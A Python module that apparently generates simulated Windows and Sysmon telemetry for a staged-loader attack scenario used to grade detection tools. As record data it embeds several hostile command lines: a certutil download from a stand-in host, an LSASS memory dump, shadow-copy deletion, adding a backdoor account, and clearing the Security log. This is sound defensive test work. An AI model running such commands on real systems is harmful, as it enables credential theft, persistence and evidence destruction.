"""storyline_reader_staged_loader -- a staged loader chain started from a PDF reader: reader -> cmd ->
PowerShell -> a native loader that does the credential theft and then fans out into the persistence,
recovery-inhibition, account and log-clearing steps. Every alert-raising process is created by the
previous stage's alert-raising process: a SPAWN CHAIN that is three hops deep before it fans out.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    reader_shell -> ps_encoded -> lsass_read -> {tool_download, service_persistence, sched_task,
                                                  shadow_delete, account_add, log_clear}
    (plus ps_cradle (4104) and directory_tamper (5136 on the DC): alerts without a parent key)

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7). The DEEP-chain keyed shape: every stage is the child of the
previous one (reader -> cmd -> PowerShell -> loader), so the step-level links run down a chain of three
spawn hops before they fan out from the loader, unlike the shallow stars of the other keyed storylines. The
step that holds the loader's creation (``lsass_read``) is the parent of six later steps. The builder marks each
step's alert-raising record (``trigger=True``); the oracle's ``causal_links`` are derived from the raw records by
``sysmon_tree.derive_links`` (B's trigger EID 1 has ParentProcessGuid == A's trigger ProcessGuid; nothing else
is graded).

PROCESS TREE (one workstation; the DC emits only a Windows Security record; ``[rule]`` = a step's trigger)

    explorer -> FoxitReader -> cmd C [office-spawn]                          (step reader_shell)
                                +--> powershell -enc [encoded-cmd] = P         (step ps_encoded)
                                       +--> recon children                     (helpers of ps_cradle)
                                       +--> loader -ma lsass [lsass-dump] = L   (step lsass_read; EID 10 -> lsass)
                                              +--> certutil -urlcache [certutil]       (step tool_download)
                                              +--> ldifde                             (helper of directory_tamper)
                                              +--> sc.exe create [service]             (step service_persistence)
                                              +--> schtasks /create [schtasks]         (step sched_task)
                                              +--> vssadmin delete shadows [shadow]    (step shadow_delete)
                                              +--> net user /add [local-account]       (step account_add)
                                              +--> wevtutil cl Security [log-clear]    (step log_clear)

    8 trigger-to-trigger spawn links.

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 10) and ``windows_eventlog`` (4104, 5136, 7045, 1102). No
dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: account, workstation and DC addresses, script-block count (1-3), the AD
attribute, the loader name and the service binary path.

SAFETY. Simulation only: ``.invalid`` names, private addresses, a fixed calendar epoch, no wall clock.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "rsl"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("reader_shell", "sysmon", True,
                  "the PDF reader starts a command shell (a document host spawns a shell)"),
    ChainStepSpec("ps_encoded", "sysmon", True,
                  "the shell starts a PowerShell with an encoded command"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "that PowerShell's script block is a download-and-execute cradle"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "the loader the PowerShell staged is started against lsass.exe and opens it with a memory-read mask"),
    ChainStepSpec("tool_download", "sysmon", True,
                  "the loader fetches its next-stage module with certutil"),
    ChainStepSpec("directory_tamper", "windows_eventlog", True,
                  "the stolen account writes a delegation / key-credential attribute on the domain controller"),
    ChainStepSpec("service_persistence", "sysmon", True,
                  "the loader creates a service whose image path is in a user-writable folder (sc.exe create, then 7045)"),
    ChainStepSpec("sched_task", "sysmon", True,
                  "the loader registers a scheduled task"),
    ChainStepSpec("shadow_delete", "sysmon", True,
                  "the loader deletes the volume shadow copies"),
    ChainStepSpec("account_add", "sysmon", True,
                  "the loader adds a local backdoor account"),
    ChainStepSpec("log_clear", "sysmon", True,
                  "the loader clears the Security event log (wevtutil cl, then Event 1102)"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_log_maintenance", "windows_eventlog", True,
                  "another administrator clears a different server's Security log during scheduled maintenance (BENIGN)"),
)

_ACCOUNTS = ("g.ops", "v.finance", "i.admin", "q.helpdesk")
_WKS = ("wks-ops-10", "wks-fin-28", "wks-adm-06", "wks-hlp-15")
_LOADERS = ("stage3.exe", "ldr_x64.exe", "wuauhelp.exe")
_ATTRS = ("msDS-AllowedToDelegateTo", "msDS-KeyCredentialLink", "servicePrincipalName")
_BACKDOOR = ("svc_scan", "svc_report", "svc_indexer")
_CRADLE = "$b=[Convert]::FromBase64String('SGVsbG8gd29ybGQ='); [Reflection.Assembly]::Load($b)"
_ENC = "JABiAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAApAA=="
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_PS = _SYS + "WindowsPowerShell\\v1.0\\powershell.exe"


def build(seed: int):
    rng = Random(seed * 1299827 + 83)
    user = rng.choice(_ACCOUNTS)
    wks_name = rng.choice(_WKS)
    ip = f"10.49.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    dc_ip = f"10.49.0.{rng.randint(2, 9)}"
    loader_name = rng.choice(_LOADERS)
    attr = rng.choice(_ATTRS)
    ghost = rng.choice(_BACKDOOR)
    n_ps = 1 + seed % 3
    svc_name = f"WinHlp{rng.randint(10, 99)}"
    svc_path = f"C:\\ProgramData\\{svc_name.lower()}.exe"

    wks = Host(wks_name, ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}
    t0 = BASE_MS

    def add(label: str, source_type: str, raw: dict, ts: int, ip_: str = ip, trigger: bool = False) -> None:
        em.add(label, source_type, raw, ts, ip_, trigger=trigger)

    def spawn(label: str, p, trigger: bool = True) -> None:
        add(label, "sysmon", p.create_record(), p.start_ms, trigger=trigger)

    explorer = wks.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    reader = wks.proc("C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitReader.exe",
                      "FoxitReader.exe C:\\Users\\Public\\statement.pdf", user, t0, explorer)
    cmd = wks.proc(_SYS + "cmd.exe", "cmd.exe /c start /min powershell", user, t0 + 4_000, reader)
    ps = wks.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC}", user, t0 + 8_000, cmd)
    recon = [wks.proc(_SYS + exe, c, user, t0 + 14_000 + i * 1_000, ps) for i, (exe, c) in enumerate((
        ("whoami.exe", "whoami /all"), ("hostname.exe", "hostname"), ("systeminfo.exe", "systeminfo")))]
    t_ps = t0 + 25_000
    loader = wks.proc(f"C:\\Users\\Public\\{loader_name}", f"{loader_name} -ma lsass.exe", user, t0 + 70_000, ps)
    lsass = wks.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    certutil = wks.proc(_SYS + "certutil.exe",
                        f"certutil.exe -urlcache -split -f http://stage.example.invalid/{svc_name.lower()}.dll "
                        f"C:\\ProgramData\\{svc_name.lower()}.dll",
                        user, t0 + 100_000, loader)
    ldif = wks.proc(_SYS + "ldifde.exe", f"ldifde.exe -i -f C:\\Users\\Public\\{attr}.ldf", user, t0 + 110_000, loader)
    sc = wks.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {svc_path}", user, t0 + 190_000, loader)
    schtask = wks.proc(_SYS + "schtasks.exe", f"schtasks.exe /create /tn {svc_name} /tr {svc_path} /sc onstart",
                       user, t0 + 210_000, loader)
    vss = wks.proc(_SYS + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", user, t0 + 230_000, loader)
    acct = wks.proc(_SYS + "net.exe", f"net.exe user {ghost} Passw0rd! /add", user, t0 + 250_000, loader)
    wevt = wks.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t0 + 330_000, loader)

    for p in (explorer, reader):
        spawn("reader_shell", p, trigger=False)
    spawn("reader_shell", cmd)
    notes["reader_shell"] = f"{user} on {wks_name}: FoxitReader -> cmd.exe"

    spawn("ps_encoded", ps)
    notes["ps_encoded"] = f"cmd.exe starts powershell.exe -enc on {wks_name}"

    for p in recon:
        spawn("ps_cradle", p, trigger=False)
    for i in range(n_ps):
        ts = t_ps + i * 10_000
        add("ps_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": _CRADLE, "TimeCreated": ts}, ts)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks_name}"

    spawn("lsass_read", loader)
    t_acc = loader.start_ms + 5_000
    add("lsass_read", "sysmon", loader.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
    notes["lsass_read"] = f"{loader_name} opens lsass.exe with GrantedAccess 0x1010"

    spawn("tool_download", certutil)
    notes["tool_download"] = f"certutil -urlcache fetches {svc_name.lower()}.dll"

    spawn("directory_tamper", ldif, trigger=False)
    t_dir = ldif.start_ms + 4_000
    add("directory_tamper", "windows_eventlog",
        {"EventID": 5136, "Computer": "dc02", "SubjectUserName": user, "SubjectDomainName": "CORP",
         "ObjectDN": "CN=svc-web,OU=Services,DC=corp,DC=example", "ObjectClass": "user",
         "AttributeLDAPDisplayName": attr, "AttributeValue": "HTTP/web01.corp.example",
         "OperationType": "%%14674", "TimeCreated": t_dir}, t_dir, dc_ip)
    notes["directory_tamper"] = f"{user} writes {attr} on CN=svc-web via dc02"

    spawn("service_persistence", sc)
    t_svc = sc.start_ms + 4_000
    add("service_persistence", "windows_eventlog",
        {"EventID": 7045, "Channel": "System", "ProviderName": "Service Control Manager",
         "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "ServiceName": svc_name, "ImagePath": svc_path, "TimeCreated": t_svc}, t_svc)
    notes["service_persistence"] = f"{svc_name} -> {svc_path} on {wks_name}"

    spawn("sched_task", schtask)
    notes["sched_task"] = f"schtasks /create {svc_name} -> {svc_path} at startup"
    spawn("shadow_delete", vss)
    notes["shadow_delete"] = "vssadmin delete shadows /all /quiet"
    spawn("account_add", acct)
    notes["account_add"] = f"net user {ghost} /add on {wks_name}"

    spawn("log_clear", wevt)
    t_clr = wevt.start_ms + 3_000
    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": t_clr}, t_clr)
    notes["log_clear"] = f"{user} clears the Security log on {wks_name}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    ts = BASE_MS + 40_000
    em.add(spec.label, "windows_eventlog",
           {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
            "Computer": "fs05", "SubjectUserName": "ops.maint", "SubjectDomainName": "CORP",
            "TimeCreated": ts}, ts, "10.50.0.7")
    return em.payloads


STORYLINE = ScenarioDef(
    name="reader_staged_loader",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_reader_staged_loader.yaml",
    summary="PDF reader -> cmd -> PowerShell -> native loader (a three-hop Sysmon spawn chain), LSASS dump, then the "
            "loader fans out: certutil download, service, scheduled task, shadow-copy delete, backdoor account and "
            "Security log clear; attribute write on the DC",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
